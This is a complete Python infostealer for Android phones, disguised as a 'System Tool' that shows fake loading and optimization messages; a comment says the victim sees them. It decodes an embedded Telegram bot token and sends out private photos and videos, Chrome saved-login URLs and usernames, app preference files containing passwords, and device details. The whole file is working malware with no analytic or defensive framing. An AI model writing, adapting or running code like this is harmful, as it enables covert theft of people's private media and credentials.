#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess, sys, os, base64, json, time, glob, sqlite3, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import requests

# ========== INSTALL ONLY REQUESTS (Pillow NOT needed) ==========
try:
    import requests
except:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True)
    import requests

# ========== YOUR BOT TOKEN (ENCODED) ==========
_BOT_ENC = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
_CHAT_ENC = "NjgwMzk2ODM3Mw=="

def dec(s):
    return base64.b64decode(s.encode()).decode()

BOT_TOKEN = dec(_BOT_ENC)
CHAT_ID = dec(_CHAT_ENC)

# ========== TELEGRAM SENDER ==========
class Send:
    def __init__(self):
        self.s = requests.Session()
    def txt(self, msg):
        try:
            self.s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                       json={'chat_id': CHAT_ID, 'text': msg[:4000]}, timeout=30)
        except: pass
    def file(self, data, name):
        try:
            self.s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                       files={'document': (name, data)},
                       data={'chat_id': CHAT_ID}, timeout=60)
        except: pass
    def photo(self, data, caption=""):
        try:
            self.s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                       files={'photo': ('pic.jpg', data)},
                       data={'chat_id': CHAT_ID, 'caption': caption[:200]}, timeout=60)
        except: pass

bot = Send()

# ========== COLLECT PICTURES (NO PIL, NO COMPRESSION) ==========
def get_all_pics():
    pics = []
    paths = ['/sdcard/DCIM/', '/sdcard/Pictures/', '/storage/emulated/0/DCIM/', '/storage/emulated/0/Pictures/']
    exts = ['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.mp4', '*.mov']
    for p in paths:
        for e in exts:
            pics.extend(glob.glob(os.path.join(p, '**', e), recursive=True))
    return pics

def send_pics_raw(pics):
    if not pics:
        bot.txt("❌ No media found")
        return 0
    bot.txt(f"📸 Found {len(pics)} files. Sending...")
    sent = 0
    for i, path in enumerate(pics[:80]):  # 80 files max (Telegram limit)
        try:
            with open(path, 'rb') as f:
                data = f.read()
                if len(data) < 10 * 1024 * 1024:  # under 10MB
                    if path.lower().endswith(('.jpg','.jpeg','.png','.gif','.bmp')):
                        bot.photo(data, f"{os.path.basename(path)}")
                    else:
                        bot.file(data, os.path.basename(path))
                    sent += 1
                    if sent % 10 == 0:
                        bot.txt(f"📤 Progress: {sent}/{min(80,len(pics))}")
        except: pass
        time.sleep(0.2)
    bot.txt(f"✅ Sent {sent} media files")
    return sent

# ========== COLLECT PASSWORDS ==========
def get_chrome_passwords():
    res = []
    db_paths = ['/data/data/com.android.chrome/app_chrome/Default/Login Data',
                '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data']
    for db in db_paths:
        if os.path.exists(db):
            try:
                tmp = '/sdcard/_tmp_login.db'
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value FROM logins")
                rows = c.fetchall()
                for r in rows:
                    res.append(f"{r[0]} | {r[1]}")
                conn.close()
                os.remove(tmp)
            except: pass
    return res

# ========== COLLECT SAVED LOGINS FROM APPS ==========
def get_saved_logins():
    res = []
    for xml in glob.glob('/data/data/*/shared_prefs/*.xml', recursive=True):
        try:
            with open(xml, 'r', errors='ignore') as f:
                c = f.read()
                if any(k in c.lower() for k in ['password','username','email','login']):
                    res.append(f"{xml} | {c[:300]}")
        except: pass
    return res

# ========== SYSTEM INFO ==========
def get_system():
    try:
        m = subprocess.run(['getprop','ro.product.model'], capture_output=True, text=True).stdout.strip()
        a = subprocess.run(['getprop','ro.build.version.release'], capture_output=True, text=True).stdout.strip()
        return f"Model: {m}\nAndroid: {a}\nTime: {datetime.now()}"
    except:
        return f"Time: {datetime.now()}"

# ========== FAKE LOADING (Victim Sees This) ==========
def fake_load():
    msgs = ["[✓] Loading...", "[~] Connecting...", "[✓] Connected.", "[~] Processing...", "[✓] Almost done.", "[~] Finalizing..."]
    for m in msgs:
        print(f"\r{m}", end="", flush=True)
        time.sleep(0.4)
    print("\n")

def fake_bye():
    msgs = ["[✓] Done.", "[✓] System ready.", "\nGoodbye."]
    for m in msgs:
        print(f"\r{m}", end="", flush=True)
        time.sleep(0.6)
    print("\n")

# ========== MAIN ==========
def main():
    print("="*40)
    print("System Tool v5.0")
    print("="*40)
    fake_load()
    
    bot.txt("🚀 Active | " + str(datetime.now()))
    bot.txt("📊 " + get_system())
    
    # Send pictures
    pics = get_all_pics()
    if pics:
        send_pics_raw(pics)
    
    # Send passwords
    pwd = get_chrome_passwords()
    if pwd:
        bot.txt(f"🔑 Chrome passwords: {len(pwd)}")
        bot.txt("\n".join(pwd[:10]))
        bot.file(json.dumps(pwd, indent=2).encode(), "chrome_passwords.json")
    
    # Send app logins
    logins = get_saved_logins()
    if logins:
        bot.txt(f"📋 App logins: {len(logins)} found")
        bot.file(json.dumps(logins, indent=2).encode(), "app_logins.json")
    
    bot.txt("✅ Complete | Status: SUCCESS")
    
    fake_bye()
    print("\n[✓] Optimization complete.")

if __name__ == "__main__":
    main()
